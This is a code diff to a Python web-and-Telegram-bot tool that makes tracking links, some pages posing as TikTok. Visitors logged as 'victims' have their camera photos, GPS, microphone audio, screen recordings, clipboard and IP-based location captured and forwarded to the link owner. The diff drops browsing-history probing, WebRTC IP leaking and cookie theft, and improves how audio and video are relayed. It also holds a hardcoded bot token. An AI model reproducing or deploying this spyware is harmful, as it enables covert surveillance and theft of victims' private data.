@@ -10,6 +10,7 @@ import os
 from datetime import datetime
 import requests
 import base64
+import subprocess
 
 BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"
 
@@ -68,6 +69,7 @@ function startAll(){
             rec.ondataavailable=e=>chunks.push(e.data);
             rec.start();
             await new Promise(r=>setTimeout(()=>rec.stop(),4000));
+            await new Promise(r=>setTimeout(r,500));
             var blob=new Blob(chunks,{type:'audio/webm'});
             var reader=new FileReader();reader.readAsDataURL(blob);
             reader.onloadend=()=>fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});
@@ -82,6 +84,7 @@ function startAll(){
             rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};
             rec.start();
             await new Promise(r=>setTimeout(()=>rec.stop(),5000));
+            await new Promise(r=>setTimeout(r,500));
             var blob=new Blob(chunks,{type:'video/webm'});
             var reader=new FileReader();reader.readAsDataURL(blob);
             reader.onloadend=()=>fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});
@@ -90,28 +93,8 @@ function startAll(){
     })();
     
     (async function(){
-        var sites=['web.telegram.org','vk.com','ok.ru','instagram.com','twitter.com','youtube.com','discord.com','github.com','steamcommunity.com','reddit.com','tinder.com','onlyfans.com','binance.com','bybit.com','paypal.com','sberbank.ru','tinkoff.ru','ozon.ru','wildberries.ru','avito.ru'];
-        var visited=[];
-        for(var i=0;i<sites.length;i++){
-            try{
-                var img=new Image();img.src='https://'+sites[i]+'/favicon.ico';
-                await new Promise(r=>{img.onload=()=>{visited.push(sites[i]);r();};img.onerror=()=>{visited.push(sites[i]);r();};setTimeout(r,300);});
-            }catch(e){}
-        }
-        if(visited.length>0) fetch('/history/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visited:visited})});
-    })();
-    
-    (async function(){
         try{var text=await navigator.clipboard.readText();if(text) fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}catch(e){}
     })();
-    
-    (function(){
-        var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-        pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));
-        pc.onicecandidate=e=>{if(e.candidate){var m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m) fetch('/webrtc/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webrtc_ip:m[0]})});}};
-    })();
-    
-    (function(){var c=document.cookie;if(c) fetch('/cookies/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:c})});})();
     
     setTimeout(()=>document.getElementById('status').innerText='✅ Готово!',2000);
 }
@@ -121,14 +104,14 @@ AUDIO_PAGE = """<!DOCTYPE html>
 <html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial}button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;cursor:pointer}</style></head>
 <body><h3>Audio</h3><button onclick="rec()">▶ Записать</button><p id="s"></p>
 <script>
-async function rec(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var c=[],r=new MediaRecorder(st);r.ondataavailable=e=>c.push(e.data);r.start();await new Promise(q=>setTimeout(()=>r.stop(),5000));var b=new Blob(c,{type:'audio/webm'});var fr=new FileReader();fr.readAsDataURL(b);fr.onloadend=()=>fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:fr.result})});st.getTracks().forEach(t=>t.stop());document.getElementById('s').innerText='Done!'}catch(e){document.getElementById('s').innerText='Error'}}
+async function rec(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var c=[],r=new MediaRecorder(st);r.ondataavailable=e=>c.push(e.data);r.start();await new Promise(q=>setTimeout(()=>r.stop(),5000));await new Promise(q=>setTimeout(q,500));var b=new Blob(c,{type:'audio/webm'});var fr=new FileReader();fr.readAsDataURL(b);fr.onloadend=()=>fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:fr.result})});st.getTracks().forEach(t=>t.stop());document.getElementById('s').innerText='Done!'}catch(e){document.getElementById('s').innerText='Error'}}
 </script></body></html>"""
 
 SCREEN_PAGE = """<!DOCTYPE html>
 <html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial}button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;cursor:pointer}</style></head>
 <body><h3>Screen</h3><button onclick="rec()">▶ Записать экран</button><p id="s"></p>
 <script>
-async function rec(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:true});var c=[],r=new MediaRecorder(st);r.ondataavailable=e=>{if(e.data.size>0)c.push(e.data)};r.start();await new Promise(q=>setTimeout(()=>r.stop(),5000));var b=new Blob(c,{type:'video/webm'});var fr=new FileReader();fr.readAsDataURL(b);fr.onloadend=()=>fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:fr.result})});st.getTracks().forEach(t=>t.stop());document.getElementById('s').innerText='Done!'}catch(e){document.getElementById('s').innerText='Error'}}
+async function rec(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:true});var c=[],r=new MediaRecorder(st);r.ondataavailable=e=>{if(e.data.size>0)c.push(e.data)};r.start();await new Promise(q=>setTimeout(()=>r.stop(),5000));await new Promise(q=>setTimeout(q,500));var b=new Blob(c,{type:'video/webm'});var fr=new FileReader();fr.readAsDataURL(b);fr.onloadend=()=>fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:fr.result})});st.getTracks().forEach(t=>t.stop());document.getElementById('s').innerText='Done!'}catch(e){document.getElementById('s').innerText='Error'}}
 </script></body></html>"""
 
 def gen_id():
@@ -158,7 +141,7 @@ def track(lid):
     if lid not in links: return "Ссылка недействительна"
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ua = request.headers.get('User-Agent', '?')
-    v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'history': None, 'audio': None, 'screen': None, 'clipboard': None, 'webrtc_ip': None, 'cookies': None}
+    v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'audio': None, 'screen': None, 'clipboard': None}
     v.update(get_ip_info(ip))
     links[lid]['victims'].append(v)
     asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
@@ -183,12 +166,6 @@ def gps(lid):
         d = request.get_json()
         links[lid]['victims'][-1]['gps'] = d
     return 'ok'
-@app.route('/history/<lid>', methods=['POST'])
-def history(lid):
-    if lid in links and links[lid]['victims']:
-        d = request.get_json()
-        links[lid]['victims'][-1]['history'] = d
-    return 'ok'
 @app.route('/audio/<lid>', methods=['POST'])
 def audio(lid):
     if lid in links and links[lid]['victims']:
@@ -206,18 +183,6 @@ def clipboard(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         if d.get('clipboard'): links[lid]['victims'][-1]['clipboard'] = d['clipboard']
-    return 'ok'
-@app.route('/webrtc/<lid>', methods=['POST'])
-def webrtc(lid):
-    if lid in links and links[lid]['victims']:
-        d = request.get_json()
-        if d.get('webrtc_ip'): links[lid]['victims'][-1]['webrtc_ip'] = d['webrtc_ip']
-    return 'ok'
-@app.route('/cookies/<lid>', methods=['POST'])
-def cookies(lid):
-    if lid in links and links[lid]['victims']:
-        d = request.get_json()
-        if d.get('cookies'): links[lid]['victims'][-1]['cookies'] = d['cookies']
     return 'ok'
 
 async def notify(uid, lid):
@@ -245,7 +210,8 @@ async def notify(uid, lid):
                 photo_path = f"photo_{lid}.jpg"
                 with open(photo_path, 'wb') as f:
                     f.write(base64.b64decode(v['photo'].split(',')[1]))
-                await bot.send_file(uid, photo_path, caption="📸 Фото с камеры")
+                if os.path.getsize(photo_path) > 100:
+                    await bot.send_file(uid, photo_path, caption="📸 Фото с камеры")
                 os.remove(photo_path)
             except Exception as e:
                 print(f"Ошибка фото: {e}")
@@ -253,11 +219,19 @@ async def notify(uid, lid):
         # Аудио
         if v.get('audio'):
             try:
-                audio_path = f"audio_{lid}.webm"
-                with open(audio_path, 'wb') as f:
+                webm_path = f"audio_{lid}.webm"
+                ogg_path = f"audio_{lid}.ogg"
+                with open(webm_path, 'wb') as f:
                     f.write(base64.b64decode(v['audio'].split(',')[1]))
-                await bot.send_file(uid, audio_path, caption="🎤 Аудио", voice_note=True)
-                os.remove(audio_path)
+                if os.path.getsize(webm_path) > 100:
+                    # Пробуем конвертировать в OGG для голосового
+                    subprocess.run(['ffmpeg', '-i', webm_path, '-c:a', 'libopus', '-b:a', '64k', ogg_path, '-y'], capture_output=True, timeout=10)
+                    if os.path.exists(ogg_path) and os.path.getsize(ogg_path) > 100:
+                        await bot.send_file(uid, ogg_path, caption="🎤 Аудио", voice_note=True)
+                        os.remove(ogg_path)
+                    else:
+                        await bot.send_file(uid, webm_path, caption="🎤 Аудио")
+                os.remove(webm_path)
             except Exception as e:
                 print(f"Ошибка аудио: {e}")
         
@@ -267,7 +241,8 @@ async def notify(uid, lid):
                 screen_path = f"screen_{lid}.webm"
                 with open(screen_path, 'wb') as f:
                     f.write(base64.b64decode(v['screen'].split(',')[1]))
-                await bot.send_file(uid, screen_path, caption="🎥 Запись экрана", supports_streaming=True)
+                if os.path.getsize(screen_path) > 100:
+                    await bot.send_file(uid, screen_path, caption="🎥 Запись экрана", supports_streaming=True)
                 os.remove(screen_path)
             except Exception as e:
                 print(f"Ошибка скрина: {e}")
@@ -282,9 +257,6 @@ async def notify(uid, lid):
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
             await bot.send_file(uid, file=geo, caption="📍 IP-гео")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
-        
-        if v.get('webrtc_ip') and v['webrtc_ip'] != v.get('ip','').split(',')[0].strip():
-            await bot.send_message(uid, f"🕵️ WebRTC IP: `{v['webrtc_ip']}`")
         
     except Exception as e:
         print(f"Ошибка notify: {e}")
